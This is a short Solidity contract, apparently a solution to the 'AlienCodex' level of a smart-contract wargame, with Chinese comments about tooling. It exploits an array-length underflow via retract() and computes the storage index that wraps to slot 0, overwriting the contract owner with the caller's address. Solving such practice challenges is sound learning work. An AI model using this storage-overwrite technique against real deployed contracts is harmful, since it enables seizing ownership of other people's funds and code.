// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//foundry存在版本问题,所以不使用script：可以通过给参数的方式或者remix

// import "forge-std/Script.sol";
// import "forge-std/console.sol";
import "src/19-AlienCodex.sol"; 

contract AttackAlienCodex {
    AlienCodex public target;

    constructor(address _targetAddress) public {
        target = AlienCodex(_targetAddress);  // 初始化目标合约地址
    }

    function attack() public {
        target.makeContact();

        target.retract();

        uint256 index = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));
        target.revise(index, bytes32(uint256(uint160(msg.sender))));
    }

}

